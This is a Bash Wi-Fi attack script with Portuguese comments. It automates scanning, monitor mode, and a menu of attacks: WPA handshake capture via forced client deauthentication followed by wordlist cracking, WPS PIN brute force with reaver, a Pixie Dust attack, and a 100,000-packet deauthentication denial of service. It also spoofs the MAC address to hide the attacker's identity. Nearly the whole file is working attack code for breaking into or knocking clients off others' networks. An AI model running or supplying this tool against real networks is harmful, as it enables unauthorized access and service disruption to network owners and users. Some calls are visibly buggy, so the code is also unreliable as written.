#!/bin/bash

#	AUTOR: GUSTAVO DIAS DE CASTRO

##############################################################################################################################################
#Requisitos:
#	 Reaver 
#	 Aircrack-ng
#	 netools (ifconfig,iw)
###############################################################################################################################################
#Bugs Conhecidos:
#	 Erro caso o computador não possuir interfae wifi
#	 Erro caso a interface já esteja em modo promiscuo
#	 O usuario tem que saber se o Ponto de Acesso tem WPS habilitado
##############################################################################################################################################
#Falta Implementar:
#	 WEP
#	 Evil Twin 
#	 Raibow tables
#	 Salvar estado da wordlist (ultima password usada)
#	 Salvar os arquivos gerados em uma pasta oculta
#	 Funcao de verificacao caso o Ponto de Acesso possua mecanismos contra injecao de pacotes
#	 Consultar a pasta oculta para verificar se existe um handshake da rede que esta sendo atacada.
#	 Salvar estado do reaver (ultimo PIN usado)
##############################################################################################################################################

ARQ_WIFI_LIST='/tmp/IwlistScan';
ARQ_LOG='.air.log';
PATH_WORDLIST='wordlist.lst'; #O usuario deve especificar atraves dessa variavel o caminho da wordlist usada
REAVER_OUTPUT='/tmp/Reaver_Pixie_Dust';
QTD_DESAUTIC=20;
QTD_DESAUTIC_DOS=100000;
MAX_TIME=15; #Tempo de espera para capturar um handshake
TIME_AUTENTICACAO_WEP=3;
FALSE_MAC="AA:BB:CC:DD:EE:FF"; #O usuario deve especificar um mac qualquer pra mascarar o MAC verdadeiro.
COR_VERDE="\033[1;32m";
COR_VERMELHO="\033[1;31m";
COR_PADRAO="\033[0m";

#Listar a redes disponiveis
FiltraDadosRedes(){
	#O numero da celula especifica o ponto de acesso, o q essa funcao faz é pegar as informacoes dessa rede e imprimir na tela
	#Parametros: Numero da celula, Arquivo com as redes listadas
	if [ $1 -lt 10 ]; then
		DADOS_CELL=`grep -A 6 -Fi "Cell 0$1" $2`; #Se o numero for menor que dez deve adicionar um 0 na frente ex. 03 (pro filtro funcionar corretamente)
	else
		DADOS_CELL=`grep -A 6 -Fi "Cell $1" $2`;
	fi;

	ESSID=`grep -o ESSID:.* < <(echo $DADOS_CELL) | awk '{print $1}' | sed s/ESSID://`;
	MAC=`grep -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' < <(echo $DADOS_CELL)`; #Expressao regular para enderecos mac
	CANAL=`grep -io 'Channel:.*' < <(echo $DADOS_CELL) | awk '{print $1}' | sed s/Channel://`;
	SINAL=`grep -io 'level.*' <    <(echo $DADOS_CELL) | sed 's/level=//' | awk '{print $1" "$2}'`;
	
	echo -e "[${COR_VERMELHO}$i${COR_PADRAO}] $MAC $CANAL $SINAL $ESSID";
}

VerificaRoot(){
	if [ $(whoami) != root ]; then
		echo "[${COR_VERMELHO}-${COR_PADRAO}]Para continuar voce deve ter privelegios de super usuario.";
		exit;
	fi;
}

DesautenticaClientes(){
	#Injeta pacotes de desautenticacao na rede
	#Parametros: Quantidade_De_Pkt_De_Desautenticaçao, BSSID, Interface 
	xterm -fg red -T "Desautenticando Clientes" -geometry 180x20+0+320 -e aireplay-ng -0 $1 -a $2 --ignore-negative-one $3;
}

BruteForce_WPA(){
	#Parametros: Essid,BSSID,CANAL,Interface,Quantidade_De_Pkt_De_Desautenticaçao

	#Roda em Background em outro terminal o airodump que fica capturando o trafego e o escreve em um arquivo com o mesmo nome da rede.
    xterm -T "Capturando Handshake" -geometry 180x20+0+0 -e airodump-ng -w $1 -d $2 -c $3 $4 &
    #Captura o PID do airodump
	PID=`ps aux | grep airodump-ng | head -1 | awk '{print $2}'`;
	#Roda o aireplay simultaneamente com o airodump, para injetar pacotes na rede para desautenticar todos os clientes, pra acelerar a captura de um handshake
	DesautenticaClientes $QTD_DESAUTIC $2 $4;
	#Espera um determinado tempo antes de matar o airodump
	sleep $MAX_TIME;
	#Mata o airodump
	kill $PID;
	#Roda o aircrack usando uma wordlist para a quebra da senha 
	aircrack-ng -w $PATH_WORDLIST $1-0[0-9].cap
}

ChangeMAC(){
	# Parametros: Interface, NovoMac 
	ifconfig $1 down;
	ifconfig $1 hw ether $2;
	ifconfig $1 up;
}

Crack_WEP(){
	#Quebra uma chave WEP sem necessitar que tenha algum cliente conectado. 

	#Parametros: ESSID, BSSID,Canal, Interface
	ChangeMAC $4 $FALSE_MAC;
	#Coloca o airodump para capturar os ivs (Vetores de inicialização)
	xterm -T "Capturando Vetores de Inicialização" -geometry 180x20+0+0 -e airodump-ng --ivs -w $1 -d $2 -c $3 $4 & 
	xterm -fg red -T "Falsa Autenticação" -geometry 180x20+0+320 -e aireplay-ng -1 $TIME_AUTENTICACAO_WEP -e $1 -a $2 -h $FALSE_MAC $4;
	#...
}

PixieDustAttack(){
	#Esse ataque roda um algoritmo que TENTA calcular o PIN do ponto de acesso, reduzindo de 11000 possibilidades de numeros de PIN pra 1
	#Parametros: ESSID,BSSID,CANAL,Interface  

	reaver -b $2 -c $3 -i $4 -vvv -o $REAVER_OUTPUT -K -q; #Usa o reaver colocando argumentos no programa pixiewps, que possibilita tentar quebrar o pin em poucos segundos
	WPS_PIN=`grep -F "WPS pin:" $REAVER_OUTPUT | awk '{print $4}'`;
	
	if [ -n $WPS_PIN ]; then #Se o conteudo da variavel nao for nulo
		reaver -b $2 -c $3 -i $4 -vv --pin=$WPS_PIN; #Autentica na rede Via Pin wps
	fi;
}

BruteForceWPS(){
	#Parametros: ESSID,BSSID,CANAL,Interface 
	xterm -fg green -T "Brute-Force WPS (REAVER)" -geometry 180x20+0+320 -e reaver -b $2 -c $3 -i $4 -vv; #BruteForce em pin wps.
}

Sair(){
	#Desabilita o modo monitor
	#Parametros: Interface em modo monitor
	echo -e "[${COR_VERDE}+${COR_PADRAO}]Desabilitando modo monitor...";
	airmon-ng stop $1 > /dev/null; #redireciona a saida para o "Buraco negro"
	exit;
}

InterfaceModoMonitor(){
	#Coloca a interface em modo monitor
	#Parametros Interface wifi, Canal
	airmon-ng start   $1 $2 > /dev/null;
	INTERFACE_W_MON=`iwconfig 2>>  $ARQ_LOG | grep -i 'Monitor' | awk '{print $1}'`;
	echo -n $INTERFACE_W_MON;
}

VerificaWordlist(){
	#Verifica se a wordlist existe
	#Parametros: caminho da wordlist
	if [ ! -e $1 ]; then
		echo -e "[${COR_VERMELHO}-${COR_PADRAO}] Wordlist não encontrada";
		exit;
	fi;
}

MenuAtaques(){
	#Parametros: ESSID, BSSID,MAC,CANAL,INTERFACE
	echo -e "${COR_VERMELHO}METODOS DE ATAQUE${COR_PADRAO}\n[${COR_VERMELHO}1${COR_PADRAO}]BRUTEFORCE (WPA/WPA2)\n[${COR_VERMELHO}2${COR_PADRAO}]WPS\n[${COR_VERMELHO}3${COR_PADRAO}]PixieDust\n[${COR_VERMELHO}4${COR_PADRAO}]DoS";

	read NUM_ATAQUE;

	case $NUM_ATAQUE in
		1)
			BruteForce_WPA $1 $2 $3 $4 $QTD_DESAUTIC;
			;;
		2) 
			BruteForceWPS $1 $2 $3 $4;
			;;
		3)
			PixieDustAttack $1 $2 $3 $4;
			;;
		4)
			ChangeMAC $FALSE_MAC;
			DesautenticaClientes $QTD_DESAUTIC_DOS $2 $4;
			;;
			
	esac;
}

ListaRedes(){
	#Scaneia as redes disponiveis e conta a quantidade de celulas exitentes no arquivo de redes scaneadas
	echo -e "[${COR_VERDE}+${COR_PADRAO}]Buscando Pontos de Acesso...";
	iwlist $INTERFACE_W scanning > $ARQ_WIFI_LIST; #Lista as redes disponiveis em um arquivo

	QTD_REDES=`grep -Fo Cell $ARQ_WIFI_LIST | wc -l`; #Retorna o numero de celulas (Redes wifi) listadas no arquivo.
	for ((i=1;i <= $QTD_REDES;i++)); do
		FiltraDadosRedes $i $ARQ_WIFI_LIST;
	done;

}
################################################################################################################################################
#Pega o nome da placa wifi
INTERFACE_W=`iwconfig 2>> $ARQ_LOG | grep -F '802.11' | awk '{print $1}'`; #Envia possivel saida de erro para um arquivo de log e filtra o nome da placa wifi

VerificaWordlist $PATH_WORDLIST;

#ChangeMAC $INTERFACE_W $FALSE_MAC
#Nao é recomendado usar pois nao foi implementado uma funcao que apos a execucao do programa faz com que volte a MAC original, então so apos o desligamento da maquina a MAC volta ao normal

ListaRedes;

echo -n "Informe uma rede: ";
read NUM_REDE;
VerificaRoot;

#Usa a funcao que imprime os dados da rede para setar o conteudo das variaveis que serao usadas nos ataques
MAC=`FiltraDadosRedes   $NUM_REDE $ARQ_WIFI_LIST | awk '{print $2}'`;
CANAL=`FiltraDadosRedes $NUM_REDE $ARQ_WIFI_LIST | awk '{print $3}'`;
ESSID=`FiltraDadosRedes $NUM_REDE $ARQ_WIFI_LIST | awk '{print $5}' | sed s/\"//g`;

echo -e "[${COR_VERDE}+${COR_PADRAO}]Colocando interface em modo monitor..."
INTERFACE_W_MON=`InterfaceModoMonitor $INTERFACE_W $CANAL`;

MenuAtaques $ESSID $MAC $CANAL $INTERFACE_W_MON;
Sair $INTERFACE_W_MON;
##############################################################################################################################################
